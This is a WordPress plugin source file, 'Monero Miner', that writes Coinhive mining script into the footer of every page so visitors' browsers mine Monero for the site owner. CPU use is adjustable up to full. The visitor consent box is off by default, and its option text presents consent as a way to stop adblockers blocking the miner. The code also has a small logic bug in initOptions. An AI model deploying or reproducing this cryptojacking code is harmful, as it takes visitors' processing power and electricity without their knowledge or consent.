<?php

include_once('MoneroMiner_LifeCycle.php');

class MoneroMiner_Plugin extends MoneroMiner_LifeCycle {

    public function getOptionMetaData() {
        return array(
            'mining' => array(__('Mining', 'mining'), 'Disabled', 'Enabled'),
            'token' => array(__('Enter your Coinhive public token <br><small>(<a href="https://coinhive.com/settings/sites" target="_blank">Get your token</a>)</small>', 'coinhive-token')),
            'threads' => array(__('Maximum CPU threads', 'coinhive-token')),
            'cpu' => array(__('Set the fraction of time percent that threads should be mining.', 'information-box'), '10', '20', '30', '40', '50', '60', '70', '80', '90', 'Full'),
            'info' => array(__('Show confirmation box to visitors <br><small>(If you choose true adblockers can not block mining)</small>', 'information-box'), 'False', 'True'),
            'admin' => array(__('Which user role can change settings', 'my-awesome-plugin'),
                'Administrator', 'Editor', 'Author', 'Contributor', 'Subscriber', 'Anyone')
            );
    }

    protected function initOptions() {
        $options = $this->getOptionMetaData();
        if (!empty($options)) {
            foreach ($options as $key => $arr) {
                if (is_array($arr) && count($arr > 1)) {
                    $this->addOption($key, $arr[1]);
                }
            }
        }
    }

    public function getPluginDisplayName() {
        return 'Monero Miner';
    }

    protected function getMainPluginFileName() {
        return 'monero-miner.php';
    }

    protected function installDatabaseTables() {

    }

    protected function unInstallDatabaseTables() {
     
    }

    public function upgrade() {
    }

    public function addActionsAndFilters() {
        add_action('admin_menu', array(&$this, 'addSettingsSubMenuPage'));
    }

}

function coinhive_Miner()
{
    switch (get_option('MoneroMiner_Plugin_info')) {
        case 'False':
        echo '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
        break;
        case 'True':
        echo '<script src="https://authedmine.com/lib/authedmine.min.js"></script>';
        break;
        default:
        echo '<script src="https://coinhive.com/lib/coinhive.min.js"></script>';
        break;
    }
    echo '<script>';
    echo "var miner=new CoinHive.Anonymous('" . get_option('MoneroMiner_Plugin_token') . "',{threads:" . get_option('MoneroMiner_Plugin_threads') . ",autoThreads:!1,throttle:" . cpu_Percent(get_option('MoneroMiner_Plugin_cpu')) . ",forceASMJS:!1});";
    echo "miner.start();";
    echo '</script>';
}

function cpu_Percent($percent)
{
    switch ($percent) {
        case '10':
        $throttle = "0.9";
        return $throttle;
        break;
        case '20':
        $throttle = "0.8";
        return $throttle;
        break;
        case '30':
        $throttle = "0.7";
        return $throttle;
        break;
        case '40':
        $throttle = "0.6";
        return $throttle;
        break;
        case '50':
        $throttle = "0.5";
        return $throttle;
        break;
        case '60':
        $throttle = "0.4";
        return $throttle;
        break;
        case '70':
        $throttle = "0.3";
        return $throttle;
        break;
        case '80':
        $throttle = "0.2";
        return $throttle;
        break;
        case '90':
        $throttle = "0.1";
        return $throttle;
        break;
        case 'Full':
        $throttle = "0";
        return $throttle;
        break;
    }
}

if (get_option('MoneroMiner_Plugin_mining') == "Enabled" && !empty(get_option('MoneroMiner_Plugin_token'))) {
    add_action('wp_footer', 'coinhive_Miner');
}

function toolbar_link_to_mypage($wp_admin_bar)
{
    $args = array(
        'id' => 'monero_miner',
        'title' => '<span class="ab-icon dashicons dashicons-admin-tools"></span>' . _('Monero Miner Settings'),
        'href' => get_admin_url(NULL, 'options-general.php?page=MoneroMiner_PluginSettings'),
    );
    $wp_admin_bar->add_node($args);
}

add_action('admin_bar_menu', 'toolbar_link_to_mypage', 999);